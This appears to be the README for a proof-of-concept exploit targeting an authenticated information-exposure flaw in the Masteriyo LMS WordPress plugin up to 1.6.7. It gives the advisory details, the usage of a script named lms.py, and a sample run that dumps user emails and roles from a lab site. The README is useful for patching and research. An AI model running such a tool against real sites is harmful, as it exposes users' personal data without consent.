# learning-management-system
Masteriyo - LMS for WordPress &lt;= 1.6.7 - Sensitive Information Exposure

Plugin Info
---

```
Software Type 	Plugin
Software Slug 	learning-management-system (view on wordpress.org)
Patched? 	Yes
Remediation 	Update to version 1.6.8, or a newer patched version
Affected Version 	< 1.6.8
Patched Version 	1.6.8
```

CVS
---

```
Information Exposure
CVSS Vector
CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
CVSS 	6.5 (Medium)
```

Description
----

```
The Masteriyo - LMS for WordPress plugin is vulnerable to Sensitive Information Exposure in versions up to, and including, 1.6.7 via the 'get_item' REST callback. This can allow authenticated attackers to extract sensitive data including user metadata.
```




How to use
---

```

usage: lms.py [-h] -w URL -u USERNAME -p PASSWORD

WordPres

options:
  -h, --help            show this help message and exit
  -w URL, --url URL     URL of the WordPress site
  -u USERNAME, --username USERNAME
                        Username of your wordpress user
  -p PASSWORD, --password PASSWORD
                        Password of your wordpress password
```

Example
---

```
python3 lms.py -w http://wordpress.lan -u user -p useruser1
Logged in successfully.
Nonce Value: 91b27ef4d1
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|   ID | Username    | Nicename    | Email                     |   Status | Roles                 | Profile Image                                                               |
+======+=============+=============+===========================+==========+=======================+=============================================================================+
|    9 | test        | test        | test@test.com             |        0 | ['masteriyo_student'] | http://2.gravatar.com/avatar/b642b4217b34b1e8d3bd915fc65c4452?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|    8 | agent       | agent       | agent@info.com            |        0 | ['subscriber']        | http://1.gravatar.com/avatar/4a0e0a5d4619c3564b0e60b2ae973ff8?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|    7 | tagent      | tagent      | tagent@info.com           |        0 | ['subscriber']        | http://0.gravatar.com/avatar/01f353506595eeba4df1a52b35bfdee1?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|    5 | Kety_Spear  | kety_spear  | agent3@wpdirectorykit.com |        0 | ['wdk_agent']         | http://0.gravatar.com/avatar/fedf00660c526608cd5c90df793148fb?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|    4 | Garry_Novan | garry_novan | agent2@wpdirectorykit.com |        0 | ['wdk_agent']         | http://0.gravatar.com/avatar/fbc680fbc163811bea4e61ff43cccd59?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|    3 | Debra_Moran | debra_moran | agent1@wpdirectorykit.com |        0 | ['wdk_agent']         | http://1.gravatar.com/avatar/7f119498e0ed4df002f6676e1b8b1b07?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|    2 | user        | user        | user@example.com          |        0 | ['subscriber']        | http://2.gravatar.com/avatar/b58996c504c5638798eb6b511e6f49af?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
|    1 | admin       | admin       | admin@admin.com           |        0 | ['administrator']     | http://0.gravatar.com/avatar/64e1b8d34f425d19e1ee2ea7236d3028?s=96&d=mm&r=g |
+------+-------------+-------------+---------------------------+----------+-----------------------+-----------------------------------------------------------------------------+
```
